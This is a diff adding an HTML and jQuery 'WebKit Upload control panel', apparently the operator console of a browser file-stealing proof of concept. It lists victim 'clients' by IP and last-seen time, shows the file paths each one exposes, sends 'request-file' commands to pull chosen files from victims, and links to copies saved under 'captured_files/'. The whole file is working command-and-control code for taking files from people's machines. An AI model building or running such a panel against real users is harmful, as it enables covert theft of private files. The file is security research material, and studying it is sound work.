@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset=utf-8 />
+<title>WebKit Upload control panel</title>
+<link href='http://fonts.googleapis.com/css?family=Inconsolata'
+	rel='stylesheet' type='text/css'>
+<script
+	src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"
+	type="text/javascript"></script>
+<style>
+body {
+	background: #322;
+	color: #eee;
+	font-family: 'Inconsolata', Verdana, sans-serif;
+	font-size: 70%;
+}
+
+#clients, #files {
+float: left;
+width: 48%;
+margin-right: 10px;
+}
+
+a:link,a:visited {
+	color: lightgreen;
+}
+</style>
+</head>
+<body>
+<h1>WebKit Upload control panel</h1>
+<p>by <a rel="me" href="http://blog.kotowicz.net">Krzysztof
+Kotowicz</a></p>
+<div id=clients>
+<h2>Clients</h2>
+<button id="get-clients">Refresh clients</button>
+<table>
+	<thead>
+		<tr>
+            <th>ID</th>
+			<th>Created</th>
+            <th>Last seen</th>
+			<th>IP</th>
+			<th>Available</th>
+			<th>Downloaded</th>
+		</tr>
+	</thead>
+	<tbody>
+	</tbody>
+</table>
+</div>
+<div id=files>
+<h2>Files</h2>
+<button id="get-files">Refresh files</button>
+<table>
+	<thead>
+		<tr>
+            <th>Action</th>         
+			<th>Path</th>
+			<th>Size</th>
+			<th>Status</th>
+		</tr>
+	</thead>
+	<tbody>
+	</tbody>
+</table>
+</div>
+<script>
+	$(function() {
+		
+		var logUrl = 'log.php';
+		var currentClient = null;
+		
+		var get_clients = function() {
+
+			$.post(logUrl, {
+				'msg' : 'get-clients',
+				'client' : '-1'
+			}, function(json) {
+				var c, $tr, column, a;
+
+				$('#clients tbody').html('');
+				for ( var i in json.clients) {
+					if (json.clients.hasOwnProperty(i)) {
+						c = json.clients[i];
+						$tr = $('<tr>');
+						$('<a class=load-client>').attr('href', "#files")
+								.text(c.id).wrap('<td>').appendTo($tr);
+
+						var columns = [ 'created', 'last_seen', 'ip', 'files',
+								'files_downloaded' ];
+						for (column in columns) {
+							$('<td>').text("" + c[columns[column]]).appendTo(
+									$tr);
+						}
+						$tr.appendTo('#clients tbody');
+					}
+				}
+			}, 'json');
+		};
+
+		var request_file = function(id, fileid) {
+            $.post(logUrl, {
+                'msg' : 'request-file',
+                'client' : id,
+                'file': fileid
+            });
+		}
+		
+		var load_client = function() {
+            var id = currentClient;
+            if (!id) 
+           	   return false;
+           
+			$.post(logUrl, {
+				'msg' : 'get-files',
+				'client' : id
+			}, function(json) {
+				var c, $tr, column, a, $td;
+
+				$('#files tbody').html('');
+				for ( var i in json.files) {
+					if (json.files.hasOwnProperty(i)) {
+						c = json.files[i];
+						$tr = $('<tr>');
+						
+						$td = $('<td>');
+						
+						switch (c.status) {
+						  case '0': // not downloaded
+	                          $('<a href=# class=request-file>')
+                              .attr('data-clientid', id)
+                              .attr('data-fileid', i)
+                              .text('request')
+                              .appendTo($td);
+						  break;
+						  case 1: // requested
+	                      $td.text('requested');						  
+						  break;
+                          case 2: // in transfer
+                          $td.text('downloading...');
+                          break;
+                          case 3: // downloaded
+                          $('<a>').attr('href', 'captured_files/' + c.local_filename)
+                                  .attr('target', '_blank')
+                                  .text('download')
+                                  .appendTo($td);
+                          break;
+                          case 4: // in transfer
+                              $td.text('error!');
+                          break;
+						}
+						$td.appendTo($tr);
+						
+                        var columns = ['path', 'size', 'status'];
+                        for (column in columns) {
+                            $('<td>').text("" + c[columns[column]]).appendTo(
+                                    $tr);
+                        }
+						
+						$tr.appendTo('#files tbody');
+					}
+				}
+			}, 'json');
+		};
+
+		$('.load-client').live('click', function() {
+			currentClient = $(this).text();
+			load_client();
+		})
+
+        $('#get-files').click(load_client);		
+		
+        $('.request-file').live('click', function(e) {
+        	var self = e.target;
+            var fileId = $(self).attr('data-fileid');
+            var clientId = $(self).attr('data-clientid');
+            request_file(clientId, fileId);
+            $(self).after('requested...').remove();
+            return false;
+        })
+        
+		$('#get-clients').click(get_clients);
+        
+        get_clients();
+        
+	});
+</script>
+</body>
+</html>
